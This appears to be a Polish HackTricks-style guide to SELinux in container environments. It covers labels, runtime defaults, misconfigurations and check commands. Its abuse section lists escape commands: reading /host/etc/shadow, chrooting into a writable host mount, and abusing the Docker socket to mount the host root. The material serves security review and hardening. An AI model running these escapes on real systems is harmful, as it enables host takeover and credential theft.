# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Przegląd

SELinux to **system obowiązkowej kontroli dostępu oparty na etykietach (Mandatory Access Control)**. Każdy istotny proces i obiekt może mieć kontekst bezpieczeństwa, a polityka decyduje, które domeny mogą wchodzić w interakcję z którymi typami i w jaki sposób. W środowiskach kontenerowych zwykle oznacza to, że runtime uruchamia proces kontenera w ograniczonej domenie kontenera i oznacza zawartość kontenera odpowiadającymi typami. Jeśli polityka działa poprawnie, proces będzie mógł odczytywać i zapisywać zasoby, do których jego etykieta uprawnia, podczas gdy dostęp do innej zawartości hosta będzie zabroniony, nawet jeśli ta zawartość stanie się widoczna przez montowanie.

Jest to jedna z najskuteczniejszych ochron po stronie hosta dostępnych w mainstreamowych wdrożeniach kontenerów na Linuksie. Ma szczególne znaczenie na Fedora, RHEL, CentOS Stream, OpenShift i w innych ekosystemach skoncentrowanych na SELinux. W tych środowiskach recenzent, który ignoruje SELinux, często błędnie zinterpretuje, dlaczego oczywista ścieżka do przejęcia hosta jest faktycznie zablokowana.

## AppArmor Vs SELinux

Najprostsza różnica na wysokim poziomie jest taka, że AppArmor jest oparty na ścieżkach, podczas gdy SELinux jest **oparty na etykietach**. Ma to duże konsekwencje dla bezpieczeństwa kontenerów. Polityka oparta na ścieżkach może zachowywać się inaczej, jeśli ta sama zawartość hosta stanie się widoczna pod nieoczekiwaną ścieżką montowania. Polityka oparta na etykietach zadaje natomiast pytanie, jaka jest etykieta obiektu i co domena procesu może z nią zrobić. To nie czyni SELinux prostym, ale sprawia, że jest odporny na klasę założeń opartych na sztuczkach ze ścieżkami, które obrońcy czasem przypadkowo robią w systemach opartych na AppArmor.

Ponieważ model jest zorientowany na etykiety, sposób obsługi woluminów kontenerów i decyzje o relabelingu mają krytyczne znaczenie dla bezpieczeństwa. Jeśli runtime lub operator zmieni etykiety zbyt szeroko, żeby „make mounts work”, granica polityki, która miała zawierać obciążenie, może stać się znacznie słabsza niż zamierzono.

## Laboratorium

Aby sprawdzić, czy SELinux jest aktywny na hoście:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Aby sprawdzić istniejące etykiety na hoście:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Aby porównać normalne uruchomienie z takim, w którym etykietowanie jest wyłączone:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Na hoście z włączonym SELinux to bardzo praktyczna demonstracja, ponieważ pokazuje różnicę między workloadem uruchomionym w oczekiwanej domenie kontenera a tym, któremu odebrano tę warstwę egzekwowania.

## Użycie w czasie wykonywania

Podman jest szczególnie dobrze zintegrowany z SELinux na systemach, gdzie SELinux jest domyślną częścią platformy. Rootless Podman w połączeniu z SELinux to jedna z najsilniejszych standardowych baz bezpieczeństwa dla kontenerów, ponieważ proces jest już nieuprzywilejowany po stronie hosta i wciąż ograniczony przez politykę MAC. Docker również może korzystać z SELinux tam, gdzie jest on obsługiwany, chociaż administratorzy czasami go wyłączają, aby obejść problemy z etykietowaniem woluminów. CRI-O i OpenShift w dużej mierze polegają na SELinux jako części swojej izolacji kontenerów. Kubernetes również może udostępniać ustawienia związane z SELinux, ale ich wartość oczywiście zależy od tego, czy system operacyjny węzła faktycznie obsługuje i egzekwuje SELinux.

Powtarzająca się lekcja jest taka, że SELinux nie jest opcjonalnym dodatkiem. W ekosystemach zbudowanych wokół niego stanowi część oczekiwanej granicy bezpieczeństwa.

## Nieprawidłowe konfiguracje

Klasycznym błędem jest `label=disable`. Operacyjnie często dzieje się tak dlatego, że mount woluminu został odrzucony, a najszybszym krótkoterminowym rozwiązaniem było usunięcie SELinux z równania zamiast naprawienia modelu etykietowania. Innym częstym błędem jest niepoprawne przelabelowanie zawartości hosta. Szerokie operacje relabel mogą sprawić, że aplikacja zacznie działać, ale mogą też rozszerzyć zakres zasobów, do których kontener ma dostęp, znacznie poza zamierzony.

Ważne jest również, by nie mylić **installed** SELinux z **effective** SELinux. Host może wspierać SELinux, a mimo to być w trybie permissive, albo runtime może nie uruchamiać workloadu w oczekiwanej domenie. W takich przypadkach ochrona jest znacznie słabsza, niż sugeruje dokumentacja.

## Nadużycia

Gdy SELinux jest nieobecny, w trybie permissive lub szeroko wyłączony dla workloadu, ścieżki zamontowane z hosta stają się znacznie łatwiejsze do wykorzystania. Ten sam bind mount, który w przeciwnym razie byłby ograniczony przez etykiety, może stać się bezpośrednią drogą do danych hosta lub modyfikacji hosta. Jest to szczególnie istotne w połączeniu z zapisywalnymi montowaniami woluminów, katalogami runtime kontenera lub operacyjnymi skrótami, które dla wygody udostępniły wrażliwe ścieżki hosta.

SELinux często tłumaczy, dlaczego ogólny breakout writeup działa od razu na jednym hoście, ale wielokrotnie nie udaje się na innym, mimo że flagi runtime wyglądają podobnie. Brakującym składnikiem jest często wcale nie namespace ani capability, lecz granica etykiet, która pozostała nienaruszona.

Najszybszy praktyczny test to porównanie aktywnego kontekstu, a następnie sprawdzenie zamontowanych ścieżek hosta lub katalogów runtime, które normalnie byłyby ograniczone etykietami:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Jeśli obecny jest host bind mount, a etykietowanie SELinux zostało wyłączone lub osłabione, często najpierw dochodzi do ujawnienia informacji:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Jeśli mount jest zapisywalny, a container z punktu widzenia kernela jest de facto host-root, następnym krokiem jest przetestowanie kontrolowanej modyfikacji hosta zamiast zgadywania:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Na hostach obsługujących SELinux, utrata etykiet wokół katalogów stanu runtime może także ujawnić bezpośrednie ścieżki privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Te polecenia nie zastępują pełnego łańcucha ucieczki, ale bardzo szybko pokazują, czy to SELinux uniemożliwiał dostęp do danych hosta lub modyfikację plików po stronie hosta.

### Pełny przykład: SELinux wyłączony + zapisywalny punkt montowania hosta

Jeśli etykietowanie SELinux jest wyłączone, a system plików hosta jest zamontowany jako zapisywalny w `/host`, pełna ucieczka na hosta staje się zwykłym przypadkiem nadużycia bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Jeśli `chroot` powiedzie się, proces kontenera działa teraz w systemie plików hosta:
```bash
id
hostname
cat /etc/passwd | tail
```
### Pełny przykład: SELinux wyłączony + katalog runtime

Jeśli workload będzie mógł dotrzeć do socketu runtime po wyłączeniu etykiet, ucieczkę można przekazać do runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Istotna obserwacja jest taka, że SELinux często był mechanizmem kontrolnym zapobiegającym dokładnie tego rodzaju dostępowi do host-path lub runtime-state.

## Sprawdzenia

Celem sprawdzeń SELinux jest potwierdzenie, że SELinux jest włączony, zidentyfikowanie bieżącego kontekstu bezpieczeństwa oraz sprawdzenie, czy pliki lub ścieżki, które Cię interesują, są faktycznie ograniczone etykietami.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Co jest warte uwagi:

- `getenforce` powinno w idealnym przypadku zwracać `Enforcing`; `Permissive` lub `Disabled` zmienia znaczenie całej sekcji SELinux.
- Jeśli kontekst bieżącego procesu wygląda nieoczekiwanie lub jest zbyt ogólny, aplikacja może nie działać zgodnie z zamierzoną polityką kontenera.
- Jeśli pliki montowane z hosta lub katalogi runtime mają etykiety, do których proces ma zbyt swobodny dostęp, bind mounts stają się znacznie bardziej niebezpieczne.

Podczas przeglądu kontenera na platformie obsługującej SELinux nie traktuj etykietowania jako drobnego szczegółu. W wielu przypadkach to właśnie ono jest jednym z głównych powodów, dla których host nie został jeszcze przejęty.

## Domyślne ustawienia środowiska wykonawczego

| Runtime / platform | Domyślny stan | Domyślne zachowanie | Typowe ręczne osłabienia |
| --- | --- | --- | --- |
| Docker Engine | Zależne od hosta | Separacja SELinux jest dostępna na hostach z włączonym SELinux, ale dokładne zachowanie zależy od konfiguracji hosta/daemona | `--security-opt label=disable`, szerokie ponowne etykietowanie bind mountów, `--privileged` |
| Podman | Zwykle włączone na hostach z SELinux | Separacja SELinux jest standardową częścią Podman na systemach z SELinux, chyba że jest wyłączona | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Nie jest zwykle przypisywane automatycznie na poziomie Poda | Wsparcie SELinux istnieje, ale Pody zwykle wymagają `securityContext.seLinuxOptions` lub domyślnych ustawień specyficznych dla platformy; wymagane jest wsparcie runtime i węzła | słabe lub zbyt szerokie `seLinuxOptions`, uruchamianie na węzłach permissive/disabled, polityki platformy wyłączające etykietowanie |
| CRI-O / OpenShift style deployments | Zwykle stanowią istotny element | SELinux często jest kluczową częścią modelu izolacji węzła w tych środowiskach | własne polityki nadmiernie rozszerzające dostęp, wyłączanie etykietowania dla kompatybilności |

Domyślne ustawienia SELinux są bardziej zależne od dystrybucji niż domyślne seccomp. W systemach w stylu Fedora/RHEL/OpenShift, SELinux często jest centralnym elementem modelu izolacji. W systemach bez SELinux po prostu go brakuje.
